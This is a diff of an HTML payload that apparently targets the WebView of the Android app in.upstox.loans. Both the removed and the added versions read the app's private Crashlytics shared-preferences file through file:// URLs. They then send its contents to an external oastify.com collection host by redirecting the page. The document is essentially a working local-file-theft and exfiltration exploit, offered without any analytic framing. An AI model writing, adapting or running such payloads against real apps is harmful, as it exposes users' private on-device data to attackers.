@@ -1,21 +1,15 @@
 <html><body>
+<object id="f" data="file:///data/data/in.upstox.loans/shared_prefs/com.google.firebase.crashlytics.xml" type="text/xml" style="display:none"></object>
 <script>
-fetch("file:///data/data/in.upstox.loans/shared_prefs/com.google.firebase.crashlytics.xml")
-.then(function(r){return r.text()})
-.then(function(t){
-  document.location="https://2or958yk1agudxpvy153b940nrtjh95y.oastify.com/lfi_fetch?data="+encodeURIComponent(t);
-})
-.catch(function(e){
-  // Try XMLHttpRequest
-  var x = new XMLHttpRequest();
-  x.open("GET","file:///data/data/in.upstox.loans/shared_prefs/com.google.firebase.crashlytics.xml",true);
-  x.onload=function(){
-    document.location="https://2or958yk1agudxpvy153b940nrtjh95y.oastify.com/lfi_xhr?data="+encodeURIComponent(x.responseText);
-  };
-  x.onerror=function(){
-    document.location="https://2or958yk1agudxpvy153b940nrtjh95y.oastify.com/lfi_all_failed?fetch_err="+encodeURIComponent(e.message);
-  };
-  x.send();
-});
+setTimeout(function() {
+  try {
+    var obj = document.getElementById('f');
+    var doc = obj.contentDocument;
+    var data = new XMLSerializer().serializeToString(doc);
+    document.location = "https://2or958yk1agudxpvy153b940nrtjh95y.oastify.com/lfi_object?data=" + encodeURIComponent(data.substring(0,800));
+  } catch(e) {
+    document.location = "https://2or958yk1agudxpvy153b940nrtjh95y.oastify.com/lfi_object_err?msg=" + encodeURIComponent(e.message);
+  }
+}, 3000);
 </script>
 </body></html>
